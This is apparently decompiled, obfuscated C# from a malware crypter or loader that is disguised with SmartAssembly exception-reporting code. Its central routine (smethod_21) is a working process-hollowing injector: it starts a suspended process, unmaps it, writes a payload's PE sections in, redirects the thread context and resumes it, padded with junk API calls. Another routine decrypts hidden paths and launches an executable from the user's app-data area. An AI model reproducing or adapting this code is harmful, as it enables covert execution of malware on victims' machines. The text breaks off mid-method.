using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns1;
using ns10;
using ns11;
using ns2;
using ns3;
using ns6;
using ns8;
using ns9;

internal class Class17
{
	static void smethod_0()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 413:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0033;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_007a;
						case 7:
							goto IL_0083;
						case 8:
							goto IL_008c;
						case 9:
							goto IL_00af;
						case 10:
							goto IL_00bf;
						case 11:
							goto IL_00d4;
						case 12:
							goto IL_00e3;
						case 13:
							goto IL_00f0;
						case 14:
							goto IL_00ff;
						case 15:
							goto IL_011c;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_011c:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = "hhhhhhhhhheeeee";
					goto IL_0011;
					IL_0011:
					num = 3;
					text2 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0033;
					IL_0033:
					num = 4;
					if (Operators.CompareString(text, Class17.smethod_86("SYgwSIDqN1G8QkK/jvXMGw=="), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_004d;
					IL_004d:
					num = 5;
					text3 = "" + Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_007a;
					IL_007a:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_0083;
					IL_0083:
					num = 7;
					text4 = "ows\\CurrentV";
					goto IL_008c;
					IL_008c:
					num = 8;
					text5 = "" + Interaction.Environ(Class17.smethod_86("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_00af;
					IL_00af:
					num = 9;
					text6 = Class17.smethod_86("Rx4K5yj4QnSzaKx9pdBAPA==");
					goto IL_00bf;
					IL_00bf:
					num = 10;
					text7 = Interaction.Environ(Class17.smethod_86("rRhnphBugUiRcVlpVgLfjw=="));
					goto IL_00d4;
					IL_00d4:
					num = 11;
					Conversion.Int(3405);
					goto IL_00e3;
					IL_00e3:
					num = 12;
					if (Class17.smethod_30(text6))
					{
						break;
					}
					goto IL_00f0;
					IL_00f0:
					num = 13;
					Conversion.Int(3405);
					goto IL_00ff;
					IL_00ff:
					num = 14;
					Process.Start(text7 + "\\" + text6 + ".exe");
					goto IL_011c;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 413;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_1(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_0;
	}

	static bool smethod_2(Class39.Class43 class43_0, byte[] byte_0, Class39 class39_0)
	{
		Class50 @class = default(Class50);
		Class39.Class41 class2 = default(Class39.Class41);
		while (true)
		{
			byte[] byte_;
			try
			{
				byte_ = Class17.smethod_115(byte_0);
			}
			catch (Exception)
			{
				Class17.smethod_183(class39_0, Enum1.const_0, Class26.string_0);
				return false;
			}
			byte[] array = Class17.smethod_146(byte_, "<RSAKeyValue><Modulus>vk4U+ART2CCiIwE2OAD56HoAhfMyvUmWHDncCzsfnTSmz8kgFbMzuLesWECj9TGklqBbDMr0WIWzdUXH67aXGqlDIl2LPR7OOiOpFeenDkfXSiy9F3AQCmRfcGF41opFQCxLvq12wzOzzJ+h3WVHvcKfp55vReF+i861yR2ool0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			while (true)
			{
				if (array != null)
				{
					Class17.smethod_19(class39_0, Enum1.const_1);
					if (LDM65EyL5AHhD5120V())
					{
						switch (4)
						{
						case 0:
						case 1:
							break;
						case 5:
							continue;
						case 2:
						case 4:
							@class = new Class50("d98c1dd4-008f-04b2-e980-0998ecf8427e");
							goto default;
						default:
							if (class39_0.iwebProxy_0 != null)
							{
								@class.iwebProxy_0 = class39_0.iwebProxy_0;
							}
							goto IL_009c;
						case 6:
							goto IL_009c;
						case 7:
							goto IL_00b8;
						}
						break;
					}
					goto IL_009c;
				}
				Class17.smethod_183(class39_0, Enum1.const_0, Class38.string_0);
				return false;
				IL_00b8:
				return class2.bool_0;
				IL_009c:
				class2 = new Class39.Class41(class39_0, array, @class, class43_0);
				Class17.smethod_152(@class, (Delegate15)class2.method_0);
				goto IL_00b8;
			}
		}
	}

	static bool smethod_3(EventArgs1 eventArgs1_0, string string_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class17.smethod_124(eventArgs1_0.class40_0, string_0);
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static void smethod_4(Class26.Class33 class33_0)
	{
		for (int i = 0; i < class33_0.int_1; i++)
		{
			int num = class33_0.byte_1[i] & 0xFF;
			int num2 = class33_0.short_0[i];
			if (num2-- != 0)
			{
				int num3 = Class17.smethod_55(class33_0, num);
				Class17.smethod_72(class33_0.class34_0, num3);
				int num4 = (num3 - 261) / 4;
				if (num4 > 0 && num4 <= 5)
				{
					Class17.smethod_174(class33_0.class36_0, num & ((1 << num4) - 1), num4);
				}
				int num5 = Class17.smethod_150(class33_0, num2);
				Class17.smethod_72(class33_0.class34_1, num5);
				num4 = num5 / 2 - 1;
				if (num4 > 0)
				{
					Class17.smethod_174(class33_0.class36_0, num2 & ((1 << num4) - 1), num4);
				}
			}
			else
			{
				Class17.smethod_72(class33_0.class34_0, num);
			}
		}
		Class17.smethod_72(class33_0.class34_0, 256);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static int smethod_5(Font font_0, Graphics graphics_0, string string_0, int int_0)
	{
		Class51.Struct15 struct15_ = new Class51.Struct15(new Rectangle(0, 0, int_0, 10000));
		IntPtr hdc = graphics_0.GetHdc();
		IntPtr intptr_ = font_0.ToHfont();
		IntPtr intptr_2 = SelectObject(hdc, intptr_);
		DrawText(hdc, string_0, -1, ref struct15_, 3088);
		SelectObject(hdc, intptr_2);
		graphics_0.ReleaseHdc(hdc);
		return struct15_.int_3 - struct15_.int_1;
	}

	static void smethod_6(Class40 class40_0, Delegate13 delegate13_0)
	{
		if (oLMEnfKBTsIqRDPCqp())
		{
		}
		Delegate13 @delegate = default(Delegate13);
		Delegate13 delegate2 = default(Delegate13);
		Delegate13 value = default(Delegate13);
		switch (4)
		{
		case 0:
		case 4:
			@delegate = class40_0.delegate13_0;
			goto case 3;
		case 3:
			delegate2 = @delegate;
			goto case 1;
		case 1:
		case 2:
			value = (Delegate13)Delegate.Combine(delegate2, delegate13_0);
			goto default;
		default:
			@delegate = Interlocked.CompareExchange(ref class40_0.delegate13_0, value, delegate2);
			if ((object)@delegate == delegate2)
			{
				break;
			}
			goto case 3;
		case 6:
			break;
		}
	}

	static int smethod_7(Class26.Class29 class29_0)
	{
		return class29_0.int_1;
	}

	static void smethod_8(Control0 control0_0)
	{
		int num = 3;
		if (!oLMEnfKBTsIqRDPCqp())
		{
		}
		do
		{
			switch (num)
			{
			case 1:
			case 5:
				goto IL_000e;
			case 3:
				control0_0.timer_0.set_Enabled(false);
				goto IL_000e;
			case 2:
			case 4:
				control0_0.string_0 = string.Empty;
				break;
			case 6:
				return;
			}
			break;
			IL_000e:
			control0_0.image_0 = null;
			control0_0.bool_0 = false;
			num = 4;
		}
		while (LDM65EyL5AHhD5120V());
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static Bitmap smethod_9(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_10(IWebProxy iwebProxy_0, Class50 class50_0)
	{
		class50_0.iwebProxy_0 = iwebProxy_0;
	}

	static string smethod_11(string string_0)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			if (registryKey == null)
			{
				return string.Empty;
			}
			string result = (string)registryKey.GetValue(string_0, string.Empty);
			registryKey.Close();
			return result;
		}
		catch
		{
			return string.Empty;
		}
	}

	static void smethod_12(object[] object_0, Exception exception_0)
	{
		while (true)
		{
			if (exception_0 != null)
			{
				if (!oLMEnfKBTsIqRDPCqp())
				{
					switch (5)
					{
					case 0:
					case 4:
						break;
					case 1:
					case 5:
						goto IL_003a;
					case 3:
						return;
					default:
						goto end_IL_0032;
					case 6:
						return;
					}
					continue;
				}
				return;
			}
			goto IL_0066;
			IL_003a:
			if (exception_0 is SecurityException && Class48.string_0 == "1" && Class17.smethod_141().method_2((SecurityException)exception_0))
			{
				return;
			}
			goto IL_0066;
			IL_0066:
			Class17.smethod_128(exception_0, object_0);
			break;
			continue;
			end_IL_0032:
			break;
		}
		Class17.smethod_141().method_3(exception_0, bool_1: false, bool_2: false);
	}

	static void smethod_13(Class39 class39_0, IWebProxy iwebProxy_0)
	{
		class39_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_14(Class26.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static long smethod_15(Class26.Class32 class32_0)
	{
		return class32_0.long_0;
	}

	static void smethod_16(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static string smethod_17()
	{
		return Class17.smethod_95().string_0;
	}

	[DllImport("gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long GetObjectA(long long_0, long long_1, ref bool bool_0);

	static bool smethod_18(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class40_0.method_7();
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_1([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_19(Class39 class39_0, Enum1 enum1_0)
	{
		Class17.smethod_183(class39_0, enum1_0, string.Empty);
	}

	static void smethod_20(Class26.Class33 class33_0)
	{
		class33_0.int_1 = 0;
		class33_0.int_2 = 0;
	}

	static bool smethod_21(object[] object_0)
	{
		Class13.Class14 @class = new Class13.Class14();
		Class16.Delegate1 @delegate = Class13.smethod_0<Class16.Delegate1>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("ABUKocXA/8U8/dTyQqSgxw=="));
		Class16.Delegate2 delegate2 = Class13.smethod_0<Class16.Delegate2>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("0r4Q+KffRShOMrJXQ5bIPBPfs2ueDUQLhElRpvSNOD8="));
		Class16.Delegate3 delegate3 = Class13.smethod_0<Class16.Delegate3>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("Fk2eZIMApwcIWTEmb2cS+hpgxP8KTAVFVbM4GPTL2b4="));
		Class16.Delegate4 delegate4 = Class13.smethod_0<Class16.Delegate4>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("sBgrGtKz4j+pZ39VniTPP4yPMBN4WHVY4IS8ZY4fmSE="));
		Class16.Delegate5 delegate5 = Class13.smethod_0<Class16.Delegate5>(Class17.smethod_188("pdd3zZ5lwXtj8hV1GKRfVw=="), Class17.smethod_188("2duPdAetIoKQy5xe5y0s2W+3unGrWO/nhF7+U9Kw7MI="));
		Class16.Delegate6 delegate6 = Class13.smethod_0<Class16.Delegate6>(Class17.smethod_188("pdd3zZ5lwXtj8hV1GKRfVw=="), Class17.smethod_188("RxKVVbtH14pgjdXaw2C1YbWUQxywTFbqf/pZBB51J5c="));
		Class16.Delegate7 delegate7 = Class13.smethod_0<Class16.Delegate7>(Class17.smethod_188("Sk1N1W/kLlYPS5rz2GRFew=="), Class17.smethod_188("TgOhAyN9YiqdYirD3QytuA=="));
		Class16.Delegate8 delegate8 = Class13.smethod_0<Class16.Delegate8>(Class17.smethod_188("pdd3zZ5lwXtj8hV1GKRfVw=="), Class17.smethod_188("qt4tHmTORXFlu08c+szp/A=="));
		string text = (string)object_0[0];
		byte[] array = (byte[])object_0[1];
		bool flag = (bool)object_0[2];
		bool flag2 = (bool)object_0[3];
		string text2 = (string)object_0[4];
		int int_ = 0;
		string text3 = $"\"{text2}\"";
		Class16.Struct1 struct1_ = default(Class16.Struct1);
		@class.struct0_0 = default(Class16.Struct0);
		struct1_.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Class16.Struct1)));
		bool result;
		checked
		{
			try
			{
				Class13.Class14.Class15 CS_0024_003C_003E8__locals0 = new Class13.Class14.Class15();
				CS_0024_003C_003E8__locals0.class14_0 = @class;
				if (!string.IsNullOrEmpty(text))
				{
					text3 = text3 + " " + text;
				}
				if (!@delegate(text2, text3, IntPtr.Zero, IntPtr.Zero, bool_0: false, 4u, IntPtr.Zero, null, ref struct1_, ref @class.struct0_0))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(array, 60);
				int num2 = BitConverter.ToInt32(array, num + 52);
				int[] array2 = new int[179];
				array2[0] = 65538;
				if (!delegate4(@class.struct0_0.intptr_1, array2))
				{
					throw new Exception();
				}
				int num3 = array2[41];
				int int_2 = 0;
				if (!delegate2(@class.struct0_0.intptr_0, num3 + 8, ref int_2, 4, ref int_))
				{
					throw new Exception();
				}
				if (num2 == int_2 && delegate6(@class.struct0_0.intptr_0, int_2) != 0)
				{
					throw new Exception();
				}
				int int_3 = BitConverter.ToInt32(array, num + 80);
				CS_0024_003C_003E8__locals0.int_1 = BitConverter.ToInt32(array, num + 84);
				bool flag3 = false;
				CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, num2, int_3, 12288, 64);
				if (!flag && CS_0024_003C_003E8__locals0.int_0 == 0)
				{
					flag3 = true;
					CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, 0, int_3, 12288, 64);
				}
				if (CS_0024_003C_003E8__locals0.int_0 == 0)
				{
					throw new Exception();
				}
				if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0, array, CS_0024_003C_003E8__locals0.int_1, ref int_))
				{
					throw new Exception();
				}
				int num4 = num + 248;
				short num5 = BitConverter.ToInt16(array, num + 6);
				for (int i = 0; i <= num5 - 1; i++)
				{
					int num6 = BitConverter.ToInt32(array, num4 + 12);
					int num7 = BitConverter.ToInt32(array, num4 + 16);
					int srcOffset = BitConverter.ToInt32(array, num4 + 20);
					if (num7 != 0)
					{
						byte[] array3 = new byte[num7 - 1 + 1];
						Buffer.BlockCopy(array, srcOffset, array3, 0, array3.Length);
						if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0 + num6, array3, array3.Length, ref int_))
						{
							throw new Exception();
						}
					}
					num4 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(CS_0024_003C_003E8__locals0.int_0);
				if (!delegate3(@class.struct0_0.intptr_0, num3 + 8, bytes, 4, ref int_))
				{
					throw new Exception();
				}
				int num8 = BitConverter.ToInt32(array, num + 40);
				if (flag3)
				{
					CS_0024_003C_003E8__locals0.int_0 = num2;
				}
				array2[44] = CS_0024_003C_003E8__locals0.int_0 + num8;
				if (unchecked((long)delegate5(@class.struct0_0.intptr_1, array2)) != 0L)
				{
					throw new Exception();
				}
				if (flag2)
				{
					new Thread((ThreadStart)delegate
					{
						Thread.CurrentThread.IsBackground = true;
						string string_ = "fsdfsd";
						DhcpDeRegisterParamChange(15L, ref string_);
						string_ = "fsdfsdgsdgsdgsd";
						string string_2 = "GSDGSDGSDGSD";
						Class12 class12_ = default(Class12);
						ldap_modrdn(ref class12_, ref string_, ref string_2);
						Class16.Struct0 struct0_ = CS_0024_003C_003E8__locals0.class14_0.struct0_0;
						uint uint_ = (uint)CS_0024_003C_003E8__locals0.int_0;
						int int_4 = CS_0024_003C_003E8__locals0.int_1;
						Class17.smethod_97(uint_, int_4, struct0_);
						bool bool_ = true;
						GetObjectA(15324234L, 21452142152132L, ref bool_);
						string_2 = "fsdgsdgsdgsdg";
						string_ = "fsdgsdgsdg";
						OemToCharBuffA(ref string_2, ref string_, 43243434343L);
					}).Start();
				}
				else
				{
					uint SuspendCount = 0u;
					if (delegate8(@class.struct0_0.intptr_1, out SuspendCount) == -1)
					{
						throw new Exception();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_047b;
			}
			Thread.Sleep(100);
			return true;
		}
		IL_047b:
		return result;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long OemToCharBuffA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, long long_0);

	static void smethod_22(Control1 control1_0, Image image_0)
	{
		control1_0.image_0 = image_0;
		((Control)control1_0).Refresh();
	}

	static void smethod_23(Class26.Class33.Class34 class34_0, Class26.Class33.Class34 class34_1)
	{
		int num = -1;
		int num2 = 0;
		int num3 = 1;
		if (!LDM65EyL5AHhD5120V())
		{
			goto IL_009a;
		}
		goto IL_0123;
		IL_0123:
		int num4 = default(int);
		switch (num3)
		{
		case 1:
		case 10:
			break;
		default:
			goto IL_002e;
		case 8:
			goto IL_004e;
		case 0:
		case 2:
			goto IL_005c;
		case 6:
			goto IL_009a;
		case 9:
			goto IL_00f9;
		case 3:
		case 7:
			goto IL_0113;
		case 4:
			num4 = 0;
			goto IL_0113;
		}
		goto IL_0019;
		IL_004e:
		int num5 = class34_1.byte_0[num2];
		int num6 = default(int);
		int num7 = default(int);
		if (num5 != 0)
		{
			num6 = 6;
			num7 = 3;
			goto IL_002e;
		}
		goto IL_005c;
		IL_005c:
		num6 = 138;
		num7 = 3;
		goto IL_0113;
		IL_0113:
		num = num5;
		num2++;
		while (num2 < class34_1.int_1 && num == class34_1.byte_0[num2])
		{
			num2++;
			if (++num4 >= num6)
			{
				break;
			}
		}
		if (num4 < num7)
		{
			goto IL_009a;
		}
		if (num != 0)
		{
			Class17.smethod_72(class34_0, 16);
			Class17.smethod_174(class34_1.class33_0.class36_0, num4 - 3, 2);
		}
		else
		{
			if (num4 > 10)
			{
				Class17.smethod_72(class34_0, 18);
				goto IL_00f9;
			}
			Class17.smethod_72(class34_0, 17);
			Class17.smethod_174(class34_1.class33_0.class36_0, num4 - 3, 3);
		}
		goto IL_0019;
		IL_009a:
		while (num4-- > 0)
		{
			Class17.smethod_72(class34_0, num);
		}
		goto IL_0019;
		IL_002e:
		if (num == num5)
		{
			goto IL_0113;
		}
		Class17.smethod_72(class34_0, num5);
		num3 = 4;
		if (!LDM65EyL5AHhD5120V())
		{
			goto IL_004e;
		}
		goto IL_0123;
		IL_0019:
		if (num2 < class34_1.int_1)
		{
			num4 = 1;
			goto IL_004e;
		}
		return;
		IL_00f9:
		Class17.smethod_174(class34_1.class33_0.class36_0, num4 - 11, 7);
		goto IL_0019;
	}

	static void smethod_24()
	{
		string text = "";
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class51.Struct15 struct15_0, int int_1);

	static void smethod_25(int int_0, Class26.Class36 class36_0)
	{
		class36_0.byte_0[class36_0.int_1++] = (byte)int_0;
		class36_0.byte_0[class36_0.int_1++] = (byte)(int_0 >> 8);
	}

	static void smethod_26(Class26.Class29 class29_0, int int_0, int int_1)
	{
		int num = (class29_0.int_1 += int_0);
		while (num <= 32768)
		{
			int num2 = (class29_0.int_0 - int_1) & 0x7FFF;
			int num3 = 32768 - int_0;
			while (true)
			{
				if (num2 <= num3 && class29_0.int_0 < num3)
				{
					if (int_0 <= int_1)
					{
						goto IL_00b0;
					}
					while (int_0-- > 0)
					{
						class29_0.byte_0[class29_0.int_0++] = class29_0.byte_0[num2++];
					}
					if (!oLMEnfKBTsIqRDPCqp())
					{
						switch (6)
						{
						case 0:
						case 2:
							goto end_IL_009d;
						case 3:
							goto IL_00b0;
						case 1:
						case 5:
							goto end_IL_00a3;
						case 6:
							return;
						}
					}
					continue;
				}
				Class17.smethod_127(class29_0, num2, int_0, int_1);
				return;
				IL_00b0:
				Array.Copy(class29_0.byte_0, num2, class29_0.byte_0, class29_0.int_0, int_0);
				class29_0.int_0 += int_0;
				return;
				continue;
				end_IL_009d:
				break;
			}
			continue;
			end_IL_00a3:
			break;
		}
		throw new InvalidOperationException();
	}

	static void smethod_27(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class17.smethod_128(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static bool smethod_28(object[] object_0)
	{
		int num = 1;
		do
		{
			if (!Class17.smethod_21(object_0))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 6);
		return false;
	}

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_29(Class40 class40_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class17.smethod_124(class40_0, tempFileName);
			string path = Class17.smethod_137();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class40_0.eventHandler_0 != null)
			{
				class40_0.eventHandler_0(class40_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception exception_)
		{
			Class17.smethod_65(new EventArgs0(exception_), class40_0);
		}
	}

	static bool smethod_30(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (oLMEnfKBTsIqRDPCqp())
		{
		}
		switch (3)
		{
		case 0:
		case 3:
			if (processesByName.Length <= 0)
			{
				return false;
			}
			goto default;
		default:
			return true;
		case 4:
		{
			bool result = default(bool);
			return result;
		}
		}
	}

	static bool smethod_31(Class26.Class28 class28_0)
	{
		return class28_0.int_0 == class28_0.int_1;
	}

	static void smethod_32(Control0 control0_0)
	{
		Class17.smethod_177(string.Empty, control0_0);
	}

	static bool smethod_33(Class44 class44_0)
	{
		return class44_0.bool_0;
	}

	static void smethod_34(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class17.smethod_128(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static bool smethod_35(Class26.Class32 class32_0)
	{
		return Class17.smethod_139(class32_0.class35_0);
	}

	static void smethod_36(byte[] byte_0, short[] short_0, Class26.Class33.Class34 class34_0)
	{
		class34_0.short_1 = short_0;
		class34_0.byte_0 = byte_0;
	}

	static void smethod_37(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static Icon smethod_38()
	{
		try
		{
			return Class17.smethod_42();
		}
		catch (Exception)
		{
			return Class17.smethod_107("default");
		}
	}

	static void smethod_39(Exception exception_0, Class40 class40_0)
	{
		using (new Class52(class40_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class40_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class40_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class40_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class40_0.xmlWriter_0.WriteAttributeString("Method", text);
				class40_0.method_1(new Class44(exception_0, bool_1: true));
			}
			catch
			{
			}
		}
	}

	static void smethod_40(Class26.Class33 class33_0, int int_0)
	{
		Class17.smethod_56(class33_0.class34_2);
		Class17.smethod_56(class33_0.class34_0);
		Class17.smethod_56(class33_0.class34_1);
		Class17.smethod_174(class33_0.class36_0, class33_0.class34_0.int_1 - 257, 5);
		Class17.smethod_174(class33_0.class36_0, class33_0.class34_1.int_1 - 1, 5);
		Class17.smethod_174(class33_0.class36_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class17.smethod_174(class33_0.class36_0, (int)class33_0.class34_2.byte_0[Class26.Class33.int_0[i]], 3);
		}
		Class26.Class33.Class34 class34_ = class33_0.class34_0;
		Class26.Class33.Class34 class34_2 = class33_0.class34_2;
		Class17.smethod_23(class34_2, class34_);
		class34_ = class33_0.class34_1;
		class34_2 = class33_0.class34_2;
		Class17.smethod_23(class34_2, class34_);
	}

	static bool smethod_41(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_0;
	}

	static Icon smethod_42()
	{
		int int_;
		int int_2 = default(int);
		while (true)
		{
			int_ = 0;
			int num = 2;
			if (LDM65EyL5AHhD5120V())
			{
				while (true)
				{
					switch (num)
					{
					case 1:
					case 2:
						int_2 = 0;
						num = 5;
						if (LDM65EyL5AHhD5120V())
						{
							continue;
						}
						goto case 5;
					case 4:
						break;
					case 5:
					{
						int num2 = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
						if (num2 > 0)
						{
							goto IL_005b;
						}
						goto IL_006f;
					}
					default:
						goto IL_005b;
					case 6:
						goto end_IL_0034;
					}
					break;
				}
				continue;
			}
			goto IL_005b;
			IL_006f:
			return null;
			IL_005b:
			ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
			if (int_ != 0)
			{
				break;
			}
			goto IL_006f;
			continue;
			end_IL_0034:
			break;
		}
		return Icon.FromHandle(new IntPtr(int_));
	}

	static int smethod_43(Class26.Class29 class29_0)
	{
		return 32768 - class29_0.int_1;
	}

	static void smethod_44(Form0 form0_0)
	{
		//IL_0977: Unknown result type (might be due to invalid IL or missing references)
		//IL_0981: Expected O, but got Unknown
		//IL_0db7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc1: Expected O, but got Unknown
		//IL_0dcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd7: Expected O, but got Unknown
		//IL_1061: Unknown result type (might be due to invalid IL or missing references)
		//IL_106b: Expected O, but got Unknown
		//IL_106c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1076: Expected O, but got Unknown
		//IL_1077: Unknown result type (might be due to invalid IL or missing references)
		//IL_1081: Expected O, but got Unknown
		//IL_10c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ce: Expected O, but got Unknown
		//IL_10cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_10d9: Expected O, but got Unknown
		//IL_10da: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e4: Expected O, but got Unknown
		//IL_10e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ef: Expected O, but got Unknown
		//IL_10fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1105: Expected O, but got Unknown
		//IL_1484: Unknown result type (might be due to invalid IL or missing references)
		//IL_148e: Expected O, but got Unknown
		//IL_14a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ae: Expected O, but got Unknown
		//IL_14c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_14cf: Expected O, but got Unknown
		//IL_14d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_14dc: Expected O, but got Unknown
		//IL_14df: Unknown result type (might be due to invalid IL or missing references)
